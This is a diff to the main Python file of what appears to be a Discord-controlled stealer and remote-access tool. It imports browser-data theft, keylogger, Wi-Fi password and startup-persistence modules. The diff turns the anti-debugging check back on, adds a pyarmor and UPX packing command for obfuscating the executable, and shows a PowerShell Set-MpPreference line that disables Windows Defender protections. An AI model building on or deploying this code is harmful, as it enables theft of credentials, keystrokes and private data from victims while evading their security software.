@@ -4,19 +4,22 @@ from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
 import sys
-from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG
 from modules.browser import run, delete_files
 from modules.keylogger import Keylogger
-#from modules.antidebug import Antidebug
+from modules.antidebug import Antidebug
 from modules.info import start
 from modules.wifi import WifiPasswords
 from pyperclip import paste
 from modules.startup import Startup
 
 
+#
+#pyarmor pack -e " --onefile -w -i icon.ico --clean --upx-dir C:/UPX" main.py
+#
 
-#if ANTIDEBUG:
-#    Antidebug()
+if ANTIDEBUG:
+    Antidebug()
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
